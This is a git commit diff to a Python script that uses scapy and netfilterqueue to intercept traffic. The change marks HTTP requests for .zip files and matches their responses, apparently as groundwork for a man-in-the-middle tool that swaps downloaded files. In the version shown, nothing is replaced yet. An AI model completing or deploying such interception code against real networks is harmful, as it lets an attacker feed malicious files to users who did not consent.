2089aaf5c711c68ec57b068cfd8b2f99906971c5
Evan <erflynn21@gmail.com>
2020-05-11 03:30:09 -0400

    Program now filters out requests for a zip download

--- replace_downloads.py
+++ replace_downloads.py
@@ -4,15 +4,22 @@ import netfilterqueue
 import scapy.all as scapy
 
 
+ack_list = []
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print("HTTP Request")
-            print(scapy_packet.show())
+            if ".zip" in scapy_packet[scapy.Raw].load:
+                print("[+] zip Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Response")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                print(scapy_packet.show())
 
     packet.accept()
 
